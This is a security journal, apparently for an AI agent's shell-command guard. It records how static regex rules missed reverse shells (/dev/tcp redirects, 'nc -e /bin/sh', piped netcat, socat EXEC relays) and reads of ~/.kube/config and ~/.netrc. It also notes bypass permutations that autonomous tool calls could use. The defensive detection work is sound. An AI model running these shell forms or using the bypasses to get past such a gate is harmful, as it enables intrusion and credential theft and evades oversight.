# Sentinel Security Journal

## 2026-11-06 - Shell Regulator Static Reverse Shell Detection & False Positive Evasions
**Vulnerability:** Shell execution in autonomous mode (`exec_bash`) was vulnerable to interactive reverse shells and socket redirections (`/dev/tcp/...`, `/dev/udp/...`, `nc -e /bin/sh`, and piped netcat shells) because deterministic static inspection lacked patterns for network socket manipulation. Additionally, initial attempts at regex pattern matching suffered from:
1. Substring false positives where flags like `-e` or `-c` matched inside hostnames and parameters (e.g. `test-cluster`, `host-example.org`, `app-client`).
2. Ambient shell execution bypasses where `/dev/tcp/` redirects were executed directly without an explicit preceding `bash` invocation (`exec 5<>/dev/tcp/...`), since `exec_bash` already executes commands within an ambient bash process.
3. Pipe-based reverse shells (`nc host port | /bin/sh` or FIFO redirection) that omit `-e`/`-c` execution flags entirely.

**Learning:** Static regex-based security controls on shell commands must account for shell interpreter context (ambient subshell execution) and enforce strict word/flag boundaries (`\s+(?:-[a-z0-9]*[ec]\b|--(?:sh-)?exec\b)`). Regex matching on virtual shell pseudo-devices like `/dev/tcp/host/port` should not assume a prefixed interpreter command because the runtime shell interpreter is already ambient.

**Prevention:** Always test static regex danger rules against both adversarial bypass permutations (e.g., ambient redirects, pipe chaining) and common benign arguments (hostnames containing flag characters like `cluster` or `example`) to ensure zero false-positive disruption to developer workflows while maintaining complete risk coverage.

## 2026-11-06 - Static Shell Detection Expansion for Socat Relays & Kubernetes / Netrc Exfiltration
**Vulnerability:** Deterministic static shell risk gating (`InspectShellRisk`) only checked netcat variants (`nc`, `netcat`, `ncat`) for interactive network relay reverse shells and pipes, leaving `socat` unmonitored. Additionally, credential protection covered SSH, AWS, GPG, Docker, and GitHub credentials but omitted `~/.kube/config` (Kubernetes cluster administrator tokens) and `~/.netrc` (plaintext HTTP/FTP credentials).
**Learning:** Adversaries and misaligned autonomous tool calls can substitute `socat` with `EXEC:` parameters or socket-to-interpreter piping when netcat is blocked. Furthermore, cloud-native deployments frequently place high-privilege credentials in `~/.kube` and `~/.netrc` alongside traditional SSH keys.
**Prevention:** Ensure static command inspection catalogs include both classic network relays (`socat`, `nc`) and modern cloud-native credential directories (`~/.kube`, `~/.netrc`) in exfiltration patterns, enforcing strict word boundaries on binary invocations.
